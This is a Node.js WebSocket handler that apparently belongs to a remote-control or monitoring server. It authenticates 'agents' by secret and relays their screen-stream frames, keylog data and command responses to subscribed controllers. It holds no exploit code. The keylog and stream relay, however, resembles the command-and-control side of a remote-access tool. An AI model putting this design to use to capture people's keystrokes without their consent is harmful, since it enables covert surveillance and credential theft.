// src/socket/agentHandler.js
// Handle Agent WebSocket connections.
//
// Protocol:
//   Text REGISTER { agent_id, secret, hostname, ip, os }
//     → verify secret (bcrypt) against agents.json
//     → if invalid secret → close 1008 (Policy Violation)
//     → if already online  → close 1008 "already_online"
//     → if ok → store + broadcast agent_status online
//   Binary  → forward raw Buffer to all controllers (broadcast).
//   Text other → stamp agent_id → broadcast JSON to all controllers.
//   Close      → removeByWs + broadcast agent_status offline.

const agentStore = require('../store/agentStore');
const controllerStore = require('../store/controllerStore');
const heartbeat = require('../store/heartbeat');
const logger = require('../utils/logger');

/**
 * Attach event handlers to an Agent WebSocket.
 * @param {WebSocket} ws - The Agent WebSocket (already upgraded)
 * @param {import('http').IncomingMessage} req - The original HTTP upgrade request
 */
function handleAgent(ws, req) {
  const ip =
    req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';

  // This will be set after REGISTER
  let agentId = null;

  logger.info('[agent] New agent connection (awaiting REGISTER)', { ip });

  // Attach heartbeat
  const hb = heartbeat.attach(ws, `agent:${ip}`);

  // ─── message ─────────────────────────────────────────────────
  ws.on('message', async (data, isBinary) => {
    // ── Binary frame → forward ONLY to subscribed Controllers ──────
    if (isBinary) {
      logger.debug('[agent] Binary frame relay to subscribers', {
        agentId,
        bytes: data.length,
      });
      if (agentId) {
        controllerStore.broadcastToSubscribers(agentId, data, { binary: true });
      } else {
        logger.warn('[agent] Binary frame from unregistered agent, dropping');
      }
      return;
    }

    // ── Text frame → parse JSON ──────────────────────────────
    let msg;
    try {
      msg = JSON.parse(data.toString());
    } catch (err) {
      logger.warn('[agent] Invalid JSON from agent', {
        agentId,
        ip,
        error: err.message,
        preview: data.toString().substring(0, 200),
      });
      return;
    }

    // ── REGISTER ─────────────────────────────────────────────
    if (msg.type === 'REGISTER') {
      const id = msg.agent_id;
      const secret = msg.secret;

      if (!id || !secret) {
        logger.warn('[agent] REGISTER missing agent_id or secret', { ip });
        ws.close(1008, 'missing_credentials');
        return;
      }

      // Verify secret against bcrypt hash in agents.json
      const valid = await agentStore.verifySecret(id, secret);
      if (!valid) {
        logger.warn('[agent] REGISTER failed — invalid secret', { agentId: id, ip });
        ws.close(1008, 'invalid_secret');
        return;
      }

      // Try to register (will be rejected if already online)
      const registered = agentStore.register(id, ws, {
        hostname: msg.hostname || id,
        ip: msg.ip || ip,
        os: msg.os || 'unknown',
      });

      if (!registered) {
        logger.warn('[agent] REGISTER rejected — agent already online', { agentId: id, ip });
        ws.close(1008, 'already_online');
        return;
      }

      agentId = id;

      // Update heartbeat label now that we know the agentId
      hb.clear();
      const hb2 = heartbeat.attach(ws, `agent:${agentId}`);
      // Replace reference for cleanup on close
      ws._gwHeartbeat = hb2;

      logger.info('[agent] REGISTER', {
        agentId,
        hostname: msg.hostname,
        ip: msg.ip,
        os: msg.os,
      });

      // Broadcast agent_status online to all controllers
      const statusMsg = JSON.stringify({
        type: 'agent_status',
        agent_id: agentId,
        hostname: msg.hostname || agentId,
        ip: msg.ip || ip,
        os: msg.os || 'unknown',
        online: true,
      });
      controllerStore.broadcast(statusMsg);

      return;
    }

    // ── All other messages → stamp agent_id & route to initiator or subscribers ──
    if (!agentId) {
      logger.warn('[agent] Message from unregistered agent, dropping', {
        ip,
        type: msg.type,
      });
      return;
    }

    // CHÈN/GHI ĐÈ agent_id
    msg.agent_id = agentId;
    const outStr = JSON.stringify(msg);

    // 1. Streaming frames & Keylog → CHỈ forward tới các Controller trong tập subscribe
    if (msg.type === 'frame_meta' || msg.type === 'keylog' || msg.type === 'keylog_data' || msg.module === 'keylog') {
      logger.debug('[agent→controller] Stream/Keylog relay to subscribers', {
        agentId,
        type: msg.type,
      });
      controllerStore.broadcastToSubscribers(agentId, outStr);
      return;
    }

    // 2. Response cho lệnh (có command_id khớp req_id Controller đã gửi) → gửi đúng Controller, KHÔNG broadcast
    const cmdId = msg.command_id || msg.req_id || msg.id;
    if (cmdId && typeof cmdId === 'string' && controllerStore.hasCommand(cmdId)) {
      logger.info('[agent→controller] Command response relay to initiator', {
        agentId,
        type: msg.type,
        commandId: cmdId,
      });
      controllerStore.sendToCommandInitiator(cmdId, outStr);
      return;
    }

    // 3. Các message khác (không khớp command_id và không phải stream/keylog) → forward tới subscribers
    logger.info('[agent→controller] General relay to subscribers', {
      agentId,
      type: msg.type,
    });
    controllerStore.broadcastToSubscribers(agentId, outStr);
  });

  // ─── close ───────────────────────────────────────────────────
  ws.on('close', (code, reason) => {
    // Clear heartbeat
    if (ws._gwHeartbeat) {
      ws._gwHeartbeat.clear();
    } else {
      hb.clear();
    }

    // Remove from store strictly by ws object (to avoid deleting new socket if reconnected quickly)
    const removedId = agentStore.removeByWs(ws);

    if (removedId) {
      logger.info('[agent] Disconnected', {
        agentId: removedId,
        code,
        reason: reason?.toString(),
      });

      // Broadcast agent_status offline to all controllers
      const statusMsg = JSON.stringify({
        type: 'agent_status',
        agent_id: removedId,
        online: false,
      });
      controllerStore.broadcast(statusMsg);
    } else {
      logger.info('[agent] Unregistered agent disconnected', { ip, code });
    }
  });

  // ─── error ───────────────────────────────────────────────────
  ws.on('error', (err) => {
    logger.error('[agent] WebSocket error', {
      agentId,
      ip,
      error: err.message,
    });
  });
}

module.exports = handleAgent;
